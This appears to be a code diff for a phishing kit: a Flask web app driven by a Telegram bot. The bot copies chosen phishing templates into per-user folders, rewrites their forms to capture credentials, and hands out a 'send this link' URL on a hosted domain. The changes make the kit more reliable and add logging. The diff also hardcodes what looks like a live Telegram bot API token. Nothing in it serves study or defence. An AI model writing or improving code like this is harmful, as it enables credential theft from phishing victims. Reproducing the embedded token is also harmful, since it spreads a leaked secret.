@@ -19,7 +19,7 @@ logger = logging.getLogger(__name__)
 # Telegram bot API token
 API_TOKEN = '8110718903:AAFlE-nSLZZPXUSmkYdEmCc69ZvIXp7iy_k'
 bot = telebot.TeleBot(API_TOKEN)  # Initialize Telegram bot
-app = Flask(__name__)  # Initialize Flask web application
+app = Flask(__name__, static_folder=None)  # Disable default static folder
 
 # Global variables
 bot_polling_thread = None
@@ -61,6 +61,15 @@ def get_available_templates():
 user_states = {}
 
 
+# Ensure the directories exist
+@app.before_first_request
+def create_directories():
+    base_dir = os.path.abspath(os.path.dirname(__file__))
+    os.makedirs(os.path.join(base_dir, "phished_pages"), exist_ok=True)
+    os.makedirs(os.path.join(base_dir, TEMPLATES_DIR), exist_ok=True)
+    initialize_creds_file()
+
+
 # Root route - Simple confirmation that the server is running
 @app.route('/')
 def home():
@@ -80,11 +89,12 @@ def status():
 def serve_static(user_id, filename):
     base_dir = os.path.abspath(os.path.dirname(__file__))
     folder = os.path.join(base_dir, "phished_pages", user_id)
+    logger.info(f"Serving static file: {filename} from folder: {folder}")
     return send_from_directory(folder, filename)
 
 
 # Route to serve the phishing page to victims
-@app.route('/phish/<user_id>', methods=['GET'])
+@app.route('/phish/<user_id>')
 def serve_phish_page(user_id):
     base_dir = os.path.abspath(os.path.dirname(__file__))
     folder = os.path.join(base_dir, "phished_pages", user_id)
@@ -93,7 +103,11 @@ def serve_phish_page(user_id):
     
     if os.path.exists(os.path.join(folder, "index.html")):
         logger.info("Found index.html file")
-        return send_from_directory(folder, "index.html")
+        try:
+            return send_from_directory(folder, "index.html")
+        except Exception as e:
+            logger.error(f"Error serving index.html: {e}")
+            return f"Error serving page: {str(e)}", 500
     logger.error(f"Page not found in folder: {folder}")
     return "Page not found", 404
 
@@ -239,47 +253,60 @@ def handle_template_selection(message):
 
     # Get absolute paths
     base_dir = os.path.abspath(os.path.dirname(__file__))
-    template_path = os.path.join(base_dir, TEMPLATES_DIR, template, "index.html")
+    template_dir = os.path.join(base_dir, TEMPLATES_DIR, template)
     output_path = os.path.join(base_dir, "phished_pages", user_id)
 
     # Remove existing files if any
     if os.path.exists(output_path):
         try:
             shutil.rmtree(output_path)
+            logger.info(f"Removed existing directory: {output_path}")
         except Exception as e:
             logger.error(f"Error removing existing directory: {e}")
 
-    # Create fresh directory
-    os.makedirs(output_path, exist_ok=True)
+    try:
+        # Create fresh directory
+        os.makedirs(output_path, exist_ok=True)
+        logger.info(f"Created directory: {output_path}")
 
-    if os.path.exists(template_path):
-        try:
-            # Copy all files from template directory to output directory
-            template_dir = os.path.join(base_dir, TEMPLATES_DIR, template)
-            for item in os.listdir(template_dir):
-                src = os.path.join(template_dir, item)
-                dst = os.path.join(output_path, item)
-                if os.path.isfile(src):
-                    shutil.copy2(src, dst)
-                elif os.path.isdir(src):
-                    shutil.copytree(src, dst, dirs_exist_ok=True)
+        # Copy all files from template directory
+        if os.path.exists(template_dir):
+            # First copy index.html
+            index_src = os.path.join(template_dir, "index.html")
+            index_dst = os.path.join(output_path, "index.html")
+            if os.path.exists(index_src):
+                shutil.copy2(index_src, index_dst)
+                logger.info(f"Copied index.html to {index_dst}")
 
-            # Add template info for tracking
-            with open(os.path.join(output_path, "template_info.txt"), 'w') as f:
-                f.write(template)
+                # Now copy any other assets
+                for item in os.listdir(template_dir):
+                    if item != "index.html":
+                        src = os.path.join(template_dir, item)
+                        dst = os.path.join(output_path, item)
+                        if os.path.isfile(src):
+                            shutil.copy2(src, dst)
+                            logger.info(f"Copied asset {item}")
+                        elif os.path.isdir(src):
+                            shutil.copytree(src, dst, dirs_exist_ok=True)
+                            logger.info(f"Copied directory {item}")
 
-            # Prepare the phishing page with the user_id
-            output_html = os.path.join(output_path, "index.html")
-            if prepare_phishing_page(output_html, output_html, user_id, template):
-                phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
-                bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
+                # Add template info for tracking
+                with open(os.path.join(output_path, "template_info.txt"), 'w') as f:
+                    f.write(template)
+
+                # Prepare the phishing page with the user_id
+                if prepare_phishing_page(index_dst, index_dst, user_id, template):
+                    phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
+                    bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
+                else:
+                    bot.send_message(message.chat.id, "❌ Failed to prepare phishing page.")
             else:
-                bot.send_message(message.chat.id, "❌ Failed to prepare phishing page.")
-        except Exception as e:
-            logger.error(f"Error in template selection: {e}")
-            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
-    else:
-        bot.send_message(message.chat.id, f"❌ Template '{template}' not found.")
+                bot.send_message(message.chat.id, f"❌ Template index.html not found in {template_dir}")
+        else:
+            bot.send_message(message.chat.id, f"❌ Template directory not found: {template_dir}")
+    except Exception as e:
+        logger.error(f"Error in template selection: {e}")
+        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
 
 
 # Updated function to modify HTML file to keep the form method and add user_id to action
